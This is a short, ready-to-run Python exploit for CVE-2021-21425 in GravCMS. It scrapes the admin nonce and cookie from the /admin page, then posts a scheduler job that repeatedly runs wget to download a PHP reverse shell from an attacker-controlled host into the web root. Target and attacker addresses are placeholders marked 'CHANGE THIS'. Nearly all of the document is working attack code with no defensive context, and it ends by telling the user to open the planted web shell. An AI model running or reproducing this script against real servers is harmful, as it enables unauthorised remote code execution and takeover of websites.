#!/bin/python
#
# GravCMS RCE
#
# CVE-2021-21425
#
# Uploads a PHP reverse shell to GravCMS webroot.

import requests
import re
import random
import string


# CHANGE THIS
# url of the target
target = "192.168.229.12/grav-admin"

# CHANGE THIS
# local host to download reverse shell
LHOST = "192.168.45.5"

# CHANGE THIS
# local port to download reverse shell
LPORT = "8000"

def task_number(length):
    """ Create a random alphanumeric string to use as a task number """

    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def get_nonce(response):
    """ Extract admin nonce from get response """

    matched_line = [line for line in response.text.split('\n') if 'admin-nonce' in line]
    return re.findall('"([^"]*)"', matched_line[0])[2]


def get_cookie(response):
    """ Return admin cookie from get response """

    return response.cookies.get_dict()


# Using a get request to the admin path, extract cookie and nonce

print("\033[0;34mGetting admin nonce and cookie from target...")

get_response = requests.get(f"http://{target}/admin")

admin_nonce = get_nonce(get_response)

admin_cookie = get_cookie(get_response)


# Command to run on target
command_bin = "/usr/bin/wget"

# Command arguments
command_arg = f"http://{LHOST}:{LPORT}/rev-shell.php -O /var/www/html/grav-admin/rev-shell.php"

# Random alphanumeric for task num
task = task_number(5)


# post data to create a file to check exploit
command_data = {'task' : 'SaveDefault',
f"data[custom_jobs][#{task}][command]" : command_bin,
f"data[custom_jobs][#{task}][args]" : command_arg,
f"data[custom_jobs][#{task}][at]" : '* * * * *',
f"data[custom_jobs][#{task}][output]" : '',
f"data[status][#{task}]" : 'enabled',
f"data[custom_jobs][#{task}][output_mode]" : 'append',
'admin-nonce' : admin_nonce
}

print("\033[0;34mSending payload...")

response = requests.post(f"http://{target}/admin/config/scheduler", data=command_data, cookies=admin_cookie)

if "Successfully saved" in response.text:
    print("\033[0;32mTask has been successfully saved! Wait 1 minute then navigate to your web shell!")
